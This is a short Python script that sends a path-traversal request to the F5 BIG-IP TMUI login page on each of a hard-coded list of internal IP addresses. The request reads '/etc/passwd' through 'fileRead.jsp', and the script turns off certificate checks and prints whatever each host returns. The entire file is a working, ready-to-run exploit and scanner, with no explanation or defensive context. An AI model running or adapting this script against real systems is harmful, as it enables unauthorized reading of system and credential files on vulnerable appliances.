#!/usr/bin/python3

import requests

requests.packages.urllib3.disable_warnings() 

#ips = ['10.142.127.100','10.142.127.102','10.142.127.104','10.142.127.106','10.142.68.9']
ips = ['10.142.128.212','10.142.128.211','10.142.125.15','10.142.128.233','10.142.106.168','10.142.62.140','10.142.24.169','10.142.24.168','10.142.128.235','10.142.68.11','10.142.128.234','10.142.125.244','10.142.24.245','10.142.128.227','10.142.128.202','10.142.128.202','10.142.125.14','10.142.106.171','10.142.68.8','10.142.106.166','10.142.128.210','10.142.128.214','10.142.106.167','10.142.68.10','10.142.68.10','10.142.68.12','10.142.24.246','10.142.62.140','10.142.128.203']
for ip in ips:
    link ='https://' + ip +'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
    try:
        f = requests.get(link, verify=False)
        if f.status_code == 200:
            print(ip + ": " + f.text)
        if f.status_code == 404:
            print (ip + ": " + f.text)
    except requests.exceptions.RequestException as e:
        print (e)
